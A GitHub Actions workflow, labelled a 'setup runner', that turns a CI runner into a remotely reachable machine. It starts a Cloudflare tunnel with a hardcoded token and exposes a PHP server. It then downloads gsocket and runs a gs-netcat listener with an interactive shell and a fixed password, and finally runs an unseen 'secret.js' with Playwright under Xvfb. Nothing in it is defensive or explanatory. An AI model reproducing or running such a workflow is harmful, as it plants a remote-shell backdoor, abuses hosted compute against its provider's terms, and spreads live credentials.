name: Full Setup Runner

on:
  workflow_dispatch:

jobs:
  run-all:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Install PHP
        run: |
          sudo apt update
          sudo apt install -y php

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install Playwright
        run: |
          npm install
          npx playwright install --with-deps

      - name: Install cloudflared
        run: |
          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
          chmod +x cloudflared
          sudo mv cloudflared /usr/local/bin/

      - name: Start cloudflared tunnel
        run: |
          cloudflared tunnel run --token eyJhIjoiMDkzNGQ4YWJkM2M1NjE3NWIzYTI5MDljMmJmOTg1ZWIiLCJ0IjoiZDZmYWZlMzItNjNlMS00ZDQyLTgzNjEtYzk1NmE1OGE3ZWMxIiwicyI6Ik5qSXhPRFV6TkRBdE1ETTVOaTAwTW1JNExXRmlNemN0TkRVeVlURmhOakl4WTJKaiJ9 &

      - name: Start PHP server
        run: |
          php -S 0.0.0.0:8080 &

      - name: Download gsocket
        run: wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gsocket_linux-x86_64.tar.gz -O gsocket.tar.gz

      - name: Extract gsocket
        run: tar -xzvf gsocket.tar.gz

      - name: Run gs-netcat listener
        run: |
          chmod +x gs-netcat
          ./gs-netcat -l -i -s Decent@5013 &

      - name: Install Xvfb
        run: sudo apt install -y xvfb

      - name: Run Node Script
        run: xvfb-run node secret.js
